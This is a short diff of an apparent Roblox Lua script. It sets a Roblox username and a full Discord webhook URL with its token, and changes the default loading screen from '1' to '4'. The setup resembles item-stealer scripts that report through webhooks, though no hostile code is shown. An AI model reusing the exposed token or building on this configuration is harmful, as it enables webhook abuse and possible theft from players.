@@ -2,7 +2,7 @@ Roblox_Username = "purel4urbrains"
 Discord_Webhook = "https://discord.com/api/webhooks/1295130293442707539/AeZPvDHQun-6kRT8AsOiwF8Ucxdmtp-h3l1-QbWecES5l6OACFs7uVUTtTxV2_yiWBD4"
 
 if selectedLoadingScreen == nil or selectedLoadingScreen == "" then
-    selectedLoadingScreen = "1"
+    selectedLoadingScreen = "4"
 end
 
 if selectedLoadingScreen == "1" then
